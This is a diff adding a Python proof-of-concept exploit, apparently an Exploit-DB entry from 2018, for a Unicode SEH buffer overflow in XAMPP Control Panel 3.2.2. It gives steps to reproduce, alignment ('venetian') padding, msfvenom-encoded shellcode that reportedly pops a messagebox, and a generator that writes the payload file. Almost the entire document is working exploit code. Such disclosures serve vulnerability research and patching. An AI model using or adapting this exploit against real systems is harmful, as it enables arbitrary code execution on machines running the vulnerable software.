@@ -1,0 +1,76 @@
+# Exploit Title: XAMPP Control Panel 3.2.2 - Buffer Overflow (SEH) (Unicode)
+# Exploit Author: Gionathan "John" Reale (0-day DoS exploit), Semen Alexandrovich Lyhin (1-day fully working exploit).
+# Shellcode Author: Giuseppe D'Amore (EDB:28996)
+# Date: 2018-11-08.
+# Software: XAMPP 
+# Version: 3.2.2 / 7.2.9 (Newest version at time of writing)
+# Download: https://sourceforge.net/projects/xampp/files/XAMPP%20Windows/7.2.9/xampp-portable-win32-7.2.9-0-VC15-installer.exe/download
+# Tested on: Windows 10 64bit with XAMPP 32bit. Should work on any Windows since XP. 
+
+# Special thanks to Deloitte Ukraine for providing a few payed hours to create this exploit. 
+
+# Steps to Reproduce: 
+# Run the python exploit script, it will create a new file with the name "exploit.txt".
+# Copy the contents of "exploit.txt" 
+# Start the program and click "Config (Top Right With Symbol)"
+# Paste the contents of "exploit.txt" into the following field: "Editor".
+# Click "Save" and then in the main window Click "Config" > "Apache (httpd.conf)". 
+# You will see that arbitrary code is executed. It should pop a messagebox. 
+
+#cat 28996.bin | msfvenom -p - -a x86 --platform win -f py  -e x86/unicode_mixed BufferRegister=EAX
+#Length is 352, but double it.
+
+buf =  ""
+buf += "\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49"
+buf += "\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
+buf += "\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51\x41\x44\x41"
+buf += "\x5a\x41\x42\x41\x52\x41\x4c\x41\x59\x41\x49\x41\x51"
+buf += "\x41\x49\x41\x51\x41\x49\x41\x68\x41\x41\x41\x5a\x31"
+buf += "\x41\x49\x41\x49\x41\x4a\x31\x31\x41\x49\x41\x49\x41"
+buf += "\x42\x41\x42\x41\x42\x51\x49\x31\x41\x49\x51\x49\x41"
+buf += "\x49\x51\x49\x31\x31\x31\x41\x49\x41\x4a\x51\x59\x41"
+buf += "\x5a\x42\x41\x42\x41\x42\x41\x42\x41\x42\x6b\x4d\x41"
+buf += "\x47\x42\x39\x75\x34\x4a\x42\x50\x31\x4a\x32\x68\x32"
+buf += "\x50\x30\x61\x54\x34\x4b\x4a\x72\x74\x4b\x72\x32\x6a"
+buf += "\x6c\x44\x4b\x4e\x72\x4d\x4c\x62\x6b\x4d\x72\x79\x78"
+buf += "\x62\x6b\x31\x62\x4d\x50\x34\x4b\x4b\x62\x31\x70\x51"
+buf += "\x6e\x6a\x6c\x50\x33\x62\x55\x68\x72\x75\x39\x69\x37"
+buf += "\x4a\x63\x51\x68\x6f\x4c\x52\x6b\x4f\x67\x44\x38\x4a"
+buf += "\x61\x45\x72\x52\x6b\x33\x4a\x4f\x30\x7a\x61\x77\x57"
+buf += "\x4e\x51\x38\x6d\x64\x4b\x4d\x64\x74\x6f\x4a\x61\x36"
+buf += "\x66\x70\x45\x42\x61\x6d\x6e\x4e\x66\x43\x31\x64\x34"
+buf += "\x50\x61\x72\x55\x58\x72\x32\x61\x53\x4e\x49\x78\x6f"
+buf += "\x55\x51\x68\x32\x49\x53\x44\x32\x55\x57\x79\x52\x6b"
+buf += "\x53\x4a\x6f\x34\x4a\x61\x55\x77\x6f\x76\x62\x6b\x6e"
+buf += "\x4c\x50\x6f\x54\x4b\x51\x6a\x6d\x4c\x6d\x31\x36\x67"
+buf += "\x42\x6b\x63\x4c\x36\x4f\x79\x6c\x39\x71\x37\x57\x72"
+buf += "\x48\x4d\x75\x4f\x54\x4f\x31\x6b\x51\x33\x38\x30\x4c"
+buf += "\x6e\x6f\x71\x39\x4e\x74\x50\x68\x6b\x70\x51\x35\x6f"
+buf += "\x68\x42\x30\x71\x79\x69\x51\x59\x6e\x70\x49\x5a\x6b"
+buf += "\x4c\x71\x47\x50\x4e\x71\x62\x30\x69\x6f\x59\x47\x41"
+buf += "\x41"
+
+# venetian padding
+
+ven = "\x53"            #push esi
+ven += "\x43"           #align
+ven += "\x58"           #pop eax
+ven += "\x43"           #align
+ven += "\x05\x50\x11"   #add eax,11005000
+ven += "\x43"           #align
+ven += "\x2d\x1c\x11"   #sub eax,33001700 
+ven += "\x43"           #align
+ven += "\x48"           #dec eax
+ven += "\x43"           #align
+ven += "\x43"*2         #nops
+
+payload = "\x43"*270 + "\x37\x53" + ven + buf + "\x43" * (6000 - 2 - 270 - len(ven+buf))
+
+try:
+    f=open("exploit.txt","w")
+    print "[+] Creating %s bytes evil payload.." %len(payload)
+    f.write(payload)
+    f.close()
+    print "[+] File created!"
+except:
+    print "File cannot be created"
